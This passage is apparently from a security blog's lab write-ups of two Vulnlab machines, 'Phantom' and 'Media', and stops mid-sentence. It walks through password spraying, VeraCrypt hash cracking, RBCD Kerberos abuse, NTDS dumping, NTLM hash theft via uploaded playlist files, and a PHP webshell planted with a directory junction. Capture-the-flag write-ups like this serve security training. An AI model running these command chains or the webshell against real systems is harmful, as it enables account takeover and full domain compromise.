class="headerlink" title="Initial Access"></a>Initial Access</h2><p>I started by exploring SMB shares accessible with the guest account:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb phantom.vl -u &#x27;guest&#x27; -p &#x27;&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/guest_share.png" alt="Guest SMB Share Access"><br>I discovered a publicly accessible share that I could connect to:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.122.37/Public -U guest</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get tech_support_email.eml</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/public_share.png" alt="Public Share Contents"></p><h2 id="Extracting-User-Information"><a href="#Extracting-User-Information" class="headerlink" title="Extracting User Information"></a>Extracting User Information</h2><p>I examined the email file for potential user accounts:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings tech_support_email.eml</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/email.png" alt="Email Analysis"><br>Two possible users were identified:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alucas@phantom.vl</span><br><span class="line">techsupport@phantom.vl</span><br></pre></td></tr></table></figure><p>The email also contained an embedded PDF with onboarding instructions. I extracted it using:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">munpack tech_support_email.eml</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/psdinfo.png" alt="PDF Information"><br>The PDF revealed a potential default password used during employee onboarding: <code>Ph4nt0m@5t4rt!</code></p><h2 id="User-Enumeration"><a href="#User-Enumeration" class="headerlink" title="User Enumeration"></a>User Enumeration</h2><p>Using the null session access, I was able to enumerate all domain users:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-lookupsid phantom.vl/guest@10.10.122.37 -target-ip 10.10.122.37 -no-pass</span><br></pre></td></tr></table></figure><p>User list obtained:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">Guest</span><br><span class="line">krbtgt</span><br><span class="line">DC$</span><br><span class="line">svc_sspr</span><br><span class="line">rnichols</span><br><span class="line">pharrison</span><br><span class="line">wsilva</span><br><span class="line">elynch</span><br><span class="line">nhamilton</span><br><span class="line">lstanley</span><br><span class="line">bbarnes</span><br><span class="line">cjones</span><br><span class="line">agarcia</span><br><span class="line">ppayne</span><br><span class="line">ibryant</span><br><span class="line">ssteward</span><br><span class="line">wstewart</span><br><span class="line">vhoward</span><br><span class="line">crose</span><br><span class="line">twright</span><br><span class="line">fhanson</span><br><span class="line">cferguson</span><br><span class="line">alucas</span><br><span class="line">ebryant</span><br><span class="line">vlynch</span><br><span class="line">ghall</span><br><span class="line">ssimpson</span><br><span class="line">ccooper</span><br><span class="line">vcunningham</span><br></pre></td></tr></table></figure><h2 id="Password-Spraying"><a href="#Password-Spraying" class="headerlink" title="Password Spraying"></a>Password Spraying</h2><p>I performed a password spray using the default onboarding password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb phantom.vl -u usernames.txt -p &#x27;Ph4nt0m@5t4rt!&#x27; --continue-on-success</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/foothold.png" alt="Successful Password Spray"><br>I found one user who hadn’t changed their default password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ibryant:Ph4nt0m@5t4rt!</span><br></pre></td></tr></table></figure><h2 id="Privilege-Escalation-Path"><a href="#Privilege-Escalation-Path" class="headerlink" title="Privilege Escalation Path"></a>Privilege Escalation Path</h2><p>Using the compromised account, I checked for additional share access:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb phantom.vl -u ibryant -p &#x27;Ph4nt0m@5t4rt!&#x27; --shares</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/more_access.png" alt="Additional Share Access"><br>I now had access to the “Departments Share” as well as NETLOGON and SYSVOL. I explored the new share:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.122.37/&#x27;Departments Share&#x27; -U ibryant</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/departments_share.png" alt="Departments Share Contents"><br>I attempted to download all files recursively:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">recurse ON</span><br><span class="line">prompt OFF</span><br><span class="line">mget *</span><br></pre></td></tr></table></figure><p>This failed due to large files in the IT share, so I specifically targeted the backup file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.122.37/&#x27;Departments Share&#x27; -U ibryant -c &#x27;timeout 120; iosize 16384; get \IT\Backup\IT_BACKUP_201123.hc&#x27;</span><br></pre></td></tr></table></figure><h2 id="Cracking-the-Encrypted-Backup"><a href="#Cracking-the-Encrypted-Backup" class="headerlink" title="Cracking the Encrypted Backup"></a>Cracking the Encrypted Backup</h2><p>The backup file was encrypted with VeraCrypt. To crack it, I first extracted the hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=./it.hc of=./hash bs=512 count=1</span><br></pre></td></tr></table></figure><p>I attempted to crack it with standard wordlists:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 13722 -a 0 hash /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>When that failed, I created a custom wordlist and rule file:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat phantom.txt</span><br><span class="line">phantom</span><br><span class="line">Phantom</span><br><span class="line">PHANTOM</span><br><span class="line">PHANT0M</span><br><span class="line">phant0m</span><br><span class="line">phantom.vl</span><br><span class="line">PHANTOM.VL</span><br><span class="line">phant0m.vl</span><br><span class="line">PHANT0M.vl</span><br><span class="line">Ph4nt0m</span><br><span class="line">PH4NT0M</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat phantom.rule </span><br><span class="line">$2 $0 $2 $3 $$</span><br><span class="line">$2 $0 $2 $3 $&amp;</span><br><span class="line">$2 $0 $2 $3 $@</span><br><span class="line">$2 $0 $2 $3 $!</span><br><span class="line">$2 $0 $2 $3 $#</span><br><span class="line">$2 $0 $2 $3 $%</span><br><span class="line">$2 $0 $2 $3 $^</span><br><span class="line">$2 $0 $2 $3 $*</span><br><span class="line">$2 $0 $2 $3 $(</span><br><span class="line">$2 $0 $2 $3 $)</span><br><span class="line">$2 $0 $2 $3 $-</span><br><span class="line">$2 $0 $2 $3 $_</span><br><span class="line">$2 $0 $2 $3 $=</span><br><span class="line">$2 $0 $2 $3 $+</span><br></pre></td></tr></table></figure><p>I ran hashcat with the custom wordlist and rules:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 13721 it.hc phantom.txt -r phantom.rule</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/cracked_hash.png" alt="Cracked Hash"></p><p>The password was cracked:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">it.hc:&lt;NOPE&gt;</span><br></pre></td></tr></table></figure><h2 id="Analyzing-Encrypted-Contents"><a href="#Analyzing-Encrypted-Contents" class="headerlink" title="Analyzing Encrypted Contents"></a>Analyzing Encrypted Contents</h2><p>I mounted the encrypted volume:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">veracrypt it.hc</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/veracrypt.png" alt="VeraCrypt Mount"><br>After searching through the files, I found credentials for user <code>lstanley</code> in <code>/config/config.boot</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vpn &#123;</span><br><span class="line">    sstp &#123;</span><br><span class="line">        authentication &#123;</span><br><span class="line">            local-users &#123;</span><br><span class="line">                username lstanley &#123;</span><br><span class="line">                    password &quot;PASS&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            mode &quot;local&quot;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h2 id="Further-Account-Compromise"><a href="#Further-Account-Compromise" class="headerlink" title="Further Account Compromise"></a>Further Account Compromise</h2><p>I checked if any service accounts used the same password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec smb phantom.vl -u usernames.txt -p &#x27;&#x27; --shares --continue-on-success</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/service.png" alt="Service Account Access"><br>I confirmed we had WinRM access with these credentials:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec winrm phantom.vl -u svc_sspr -p &#x27;&#x27;</span><br></pre></td></tr></table></figure><h2 id="BloodHound-Analysis"><a href="#BloodHound-Analysis" class="headerlink" title="BloodHound Analysis"></a>BloodHound Analysis</h2><p>I used BloodHound to map potential attack paths:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.108.178 -u svc_sspr -p &#x27;&#x27; --bloodhound --dns-server 10.10.108.178 -c All --dns-tcp</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/forcechange.png" alt="ForceChangePassword Permission"><br>I discovered that users in the ICT Security group had <code>AddAllowedToAct</code> permissions:<br><img src="/images/Phantom/path.png" alt="Attack Path"><br>I checked if we could add new computers to the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.108.178 -u svc_sspr -p &#x27;PASS&#x27; -M maq</span><br></pre></td></tr></table></figure><p>The result showed <code>MachineAccountQuota: 0</code>, meaning we couldn’t add new computer accounts.</p><h2 id="Compromising-Additional-Users"><a href="#Compromising-Additional-Users" class="headerlink" title="Compromising Additional Users"></a>Compromising Additional Users</h2><p>Using the ForceChangePassword privilege, I reset passwords for several users:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc password &quot;crose&quot; &quot;newP@ssword2022&quot; -U &quot;phantom.vl&quot;/&quot;svc_sspr&quot;%&#x27;PASS&#x27; -S DC.phantom.vl</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc password &quot;wsilva&quot; &quot;newP@ssword2022&quot; -U &quot;phantom.vl&quot;/&quot;svc_sspr&quot;%&#x27;PASS&#x27; -S DC.phantom.vl</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net rpc password &quot;rnichols&quot; &quot;newP@ssword2022&quot; -U &quot;phantom.vl&quot;/&quot;svc_sspr&quot;%&#x27;PASS&#x27; -S DC.phantom.vl</span><br></pre></td></tr></table></figure><p>I checked if any of these users could add machines to the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netexec ldap 10.10.108.178 -u usernames-p &#x27;newP@ssword2022&#x27; -M maq</span><br></pre></td></tr></table></figure><p>None of them had this privilege.</p><h2 id="Resource-Based-Constrained-Delegation-RBCD-Attack"><a href="#Resource-Based-Constrained-Delegation-RBCD-Attack" class="headerlink" title="Resource-Based Constrained Delegation (RBCD) Attack"></a>Resource-Based Constrained Delegation (RBCD) Attack</h2><p>Since we couldn’t add computer accounts, I had to leverage RBCD on SPN-less users. The process involves:</p><ol><li>Obtaining a TGT for the SPN-less user allowed to delegate to a target and retrieving the TGT session key</li><li>Changing the user’s password hash to match the TGT session key</li><li>Combining S4U2self and U2U to obtain a service ticket to the target on behalf of a more privileged user</li><li>Using the ticket to access the target as the delegated user</li></ol><p>I chose to use the <code>wsilva</code> account for this attack:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-rbcd -delegate-from &#x27;wsilva&#x27; -delegate-to &#x27;DC$&#x27; -dc-ip &#x27;10.10.108.178&#x27; -action &#x27;write&#x27; &#x27;phantom.vl&#x27;/&#x27;wsilva&#x27;:&#x27;newP@ssword2022&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/wsilva.png" alt="RBCD Configuration"><br>Next, I obtained a TGT through overpass-the-hash to use RC4:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT -hashes :$(pypykatz crypto nt &#x27;newP@ssword2022&#x27;) &#x27;phantom.vl&#x27;/&#x27;wsilva&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=wsilva.ccache</span><br></pre></td></tr></table></figure><p>I extracted the TGT session key:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">impacket-describeTicket wsilva.ccache | grep &#x27;Ticket Session Key&#x27;</span><br><span class="line">[*] Ticket Session Key            : 08d09e30adcdade32338f3241b5b183d</span><br></pre></td></tr></table></figure><p>Then I changed the user’s NT hash to match the TGT session key:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-changepasswd -newhashes :08d09e30adcdade32338f3241b5b183d &#x27;phantom.vl&#x27;/&#x27;wsilva&#x27;:&#x27;newP@ssword2022&#x27;@&#x27;DC.phantom.vl&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/wsilva_pass.png" alt="Password Change"><br>With this setup complete, I obtained a delegated service ticket through S4U2self+U2U, followed by S4U2proxy:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getST -k -no-pass -u2u -impersonate &quot;Administrator&quot; -spn &quot;cifs/DC.phantom.vl&quot; &#x27;phantom.vl&#x27;/&#x27;wsilva&#x27;</span><br></pre></td></tr></table></figure><p><img src="/images/Phantom/administrator_ccache.png" alt="Administrator Ticket"><br>I set the Kerberos ticket for use:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache</span><br></pre></td></tr></table></figure><p>Finally, I was able to access domain controller resources as Administrator:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb DC.phantom.vl --use-kcache --ntds</span><br></pre></td></tr></table></figure><p>And establish a shell with the compromised Administrator hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i phantom.vl -u Administrator -H &lt;HASH&gt;</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=3c11f61d-bbef-4060-a25c-218e7e931b55">https://api.vulnlab.com/api/v1/share?id=3c11f61d-bbef-4060-a25c-218e7e931b55</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Media</title>
      <link href="/2025/04/04/VL-Media/"/>
      <url>/2025/04/04/VL-Media/</url>
      
        <content type="html"><![CDATA[<h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>Initial port scan revealed the following open ports:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       REASON          VERSION</span><br><span class="line">22/tcp   open  ssh           syn-ack ttl 127 OpenSSH </span><br><span class="line">80/tcp   open  http          syn-ack ttl 127 Apache httpd </span><br><span class="line">3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br></pre></td></tr></table></figure><p><img src="/images/Media/media_player.png" alt="Windows Media Player Upload Interface"></p><h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>The target website featured an upload function requesting a “brief introduction video (compatible with Windows Media Player)”. This presented an opportunity to leverage NTLM hash theft.</p><h3 id="NTLM-Theft-Technique"><a href="#NTLM-Theft-Technique" class="headerlink" title="NTLM Theft Technique"></a>NTLM Theft Technique</h3><p>Using <a href="https://github.com/Greenwolf/ntlm_theft">ntlm_theft</a> to create malicious media files:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- .wax - via Windows Media Player playlist (Better, primary open)</span><br><span class="line">- .asx – via Windows Media Player playlist (Better, primary open)</span><br><span class="line">- .m3u – via Windows Media Player playlist (Worse, Win10 opens first in Groovy)</span><br></pre></td></tr></table></figure><p>I uploaded a <code>.wax</code> or <code>.asx</code> file to the target and set up Responder to capture the NTLM hash:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0 -dwv</span><br></pre></td></tr></table></figure><p><img src="/images/Media/ntlm_hash.png" alt="NTLM Hash Captured"></p><h3 id="Password-Cracking"><a href="#Password-Cracking" class="headerlink" title="Password Cracking"></a>Password Cracking</h3><p>Once I captured the hash, I used hashcat to crack it:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat hash6969.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p><img src="/images/Media/cracked_hash.png" alt="Cracked Hash"><br>Credentials obtained: </p><ul><li>Username: ENOX</li><li>Password: &lt;&gt;</li></ul><h2 id="System-Access"><a href="#System-Access" class="headerlink" title="System Access"></a>System Access</h2><p>With the credentials, I established an SSH connection:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh enox@10.10.109.139</span><br></pre></td></tr></table></figure><h2 id="Privilege-Escalation-Research"><a href="#Privilege-Escalation-Research" class="headerlink" title="Privilege Escalation Research"></a>Privilege Escalation Research</h2><p>Upon accessing the system, I discovered a PowerShell script that revealed key information about the system’s operation:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">enox@MEDIA C:\Users\enox\Documents&gt;type review.ps1</span><br><span class="line">function Get-Values &#123;</span><br><span class="line">    param (</span><br><span class="line">        [Parameter(Mandatory = $true)]</span><br><span class="line">        [ValidateScript(&#123;Test-Path -Path $_ -PathType Leaf&#125;)]</span><br><span class="line">        [string]$FilePath</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # Read the first line of the file</span><br><span class="line">    $firstLine = Get-Content $FilePath -TotalCount 1</span><br><span class="line"></span><br><span class="line">    # Extract the values from the first line</span><br><span class="line">    if ($firstLine -match &#x27;Filename: (.+), Random Variable: (.+)&#x27;) &#123;</span><br><span class="line">        $filename = $Matches[1]</span><br><span class="line">        $randomVariable = $Matches[2]</span><br><span class="line"></span><br><span class="line">        # Create a custom object with the extracted values</span><br><span class="line">        $repoValues = [PSCustomObject]@&#123;</span><br><span class="line">            FileName = $filename</span><br><span class="line">            RandomVariable = $randomVariable</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # Return the custom object</span><br><span class="line">        return $repoValues</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        # Return $null if the pattern is not found</span><br><span class="line">        return $null</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function UpdateTodo &#123;</span><br><span class="line">    param (</span><br><span class="line">        [Parameter(Mandatory = $true)]</span><br><span class="line">        [ValidateScript(&#123;Test-Path -Path $_ -PathType Leaf&#125;)]</span><br><span class="line">        [string]$FilePath</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    # Create a .NET stream reader and writer</span><br><span class="line">    $reader = [System.IO.StreamReader]::new($FilePath)</span><br><span class="line">    $writer = [System.IO.StreamWriter]::new($FilePath + &quot;.tmp&quot;)</span><br><span class="line"></span><br><span class="line">    # Read the first line and ignore it</span><br><span class="line">    $reader.ReadLine() | Out-Null</span><br><span class="line"></span><br><span class="line">    # Copy the remaining lines to a temporary file</span><br><span class="line">    while (-not $reader.EndOfStream) &#123;</span><br><span class="line">        $line = $reader.ReadLine()</span><br><span class="line">        $writer.WriteLine($line)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # Close the reader and writer</span><br><span class="line">    $reader.Close()</span><br><span class="line">    $writer.Close()</span><br><span class="line"></span><br><span class="line">    # Replace the original file with the temporary file</span><br><span class="line">    Remove-Item $FilePath</span><br><span class="line">    Rename-Item -Path ($FilePath + &quot;.tmp&quot;) -NewName $FilePath</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$todofile=&quot;C:\\Windows\\Tasks\\Uploads\\todo.txt&quot;</span><br><span class="line">$mediaPlayerPath = &quot;C:\Program Files (x86)\Windows Media Player\wmplayer.exe&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while($True)&#123;</span><br><span class="line"></span><br><span class="line">    if ((Get-Content -Path $todofile) -eq $null) &#123;</span><br><span class="line">        Write-Host &quot;Todo is empty.&quot;</span><br><span class="line">        Sleep 60 # Sleep for 60 seconds before rechecking</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        $result = Get-Values -FilePath $todofile</span><br><span class="line">        $filename = $result.FileName</span><br><span class="line">        $randomVariable = $result.RandomVariable</span><br><span class="line">        Write-Host &quot;FileName: $filename&quot;</span><br><span class="line">        Write-Host &quot;Random Variable: $randomVariable&quot;</span><br><span class="line"></span><br><span class="line">        # Opening the File in Windows Media Player</span><br><span class="line">        Start-Process -FilePath $mediaPlayerPath -ArgumentList &quot;C:\Windows\Tasks\uploads\$randomVariable\$filename&quot;</span><br><span class="line"></span><br><span class="line">        # Wait for 15 seconds</span><br><span class="line">        Start-Sleep -Seconds 15</span><br><span class="line"></span><br><span class="line">        $mediaPlayerProcess = Get-Process -Name &quot;wmplayer&quot; -ErrorAction SilentlyContinue</span><br><span class="line">        if ($mediaPlayerProcess -ne $null) &#123;</span><br><span class="line">            Write-Host &quot;Killing Windows Media Player process.&quot;</span><br><span class="line">            Stop-Process -Name &quot;wmplayer&quot; -Force</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        # Task Done</span><br><span class="line">        UpdateTodo -FilePath $todofile # Updating C:\Windows\Tasks\Uploads\todo.txt</span><br><span class="line">        Sleep 15</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Path-Traversal-Exploitation"><a href="#Path-Traversal-Exploitation" class="headerlink" title="Path Traversal Exploitation"></a>Path Traversal Exploitation</h2><p>I discovered a junction abuse vulnerability in the <code>C:\Windows\Tasks\Uploads\</code> directory. The system creates MD5 hashes from the “firstnamelastnameemail” of data input to the website during uploads.</p><h3 id="Creating-a-Webshell"><a href="#Creating-a-Webshell" class="headerlink" title="Creating a Webshell"></a>Creating a Webshell</h3><p>First, I created a simple PHP webshell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">system($_REQUEST[&#x27;cmd&#x27;]);  </span><br><span class="line">  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>I then calculated the MD5 hash that would be created:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;carlitocarlitocarlito@media.vl&quot; | md5sum</span><br><span class="line">3aab4336940e9c82d5ef05bf40d58b52  -</span><br></pre></td></tr></table></figure><p><img src="/images/Media/file_made.png" alt="File Created"><br>After verifying the hash calculation worked correctly, I deleted the folder and created a junction pointing to <code>C:\xampp\htdocs</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmdir C:\Windows\Tasks\Uploads\3aab4336940e9c82d5ef05bf40d58b52</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mklink /J C:\Windows\Tasks\Uploads\3aab4336940e9c82d5ef05bf40d58b52 C:\xampp\htdocs</span><br></pre></td></tr></table></figure><p>After re-uploading the file, the webshell appeared in <code>C:\xampp\htdocs</code>:<br><img 